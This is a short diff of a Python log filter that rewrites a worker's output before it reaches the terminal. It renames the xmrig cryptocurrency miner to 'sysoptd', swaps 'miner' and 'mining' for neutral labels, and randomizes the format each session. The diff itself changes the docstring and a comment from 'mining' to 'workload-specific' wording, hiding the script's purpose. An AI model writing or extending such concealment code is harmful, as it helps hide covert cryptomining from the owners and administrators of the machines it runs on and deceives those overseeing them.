@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 Log filter/formatter — sits between worker stdout and the terminal.
-Replaces all mining-related terms, randomizes labels and format each session.
+Replaces workload-specific terms, randomizes labels and format each session.
 """
 
 import sys
@@ -45,7 +45,7 @@ TERM_MAP = [
     (r'xmrig', 'sysoptd'),
     (r'XMRIG', 'SYSOPTD'),
     
-    # Mining-specific terminology
+    # Workload-specific terminology
     (r'\bminer\b', WORKER_LABEL),
     (r'\bMiner\b', WORKER_LABEL.title()),
     (r'\bmining\b', 'processing'),
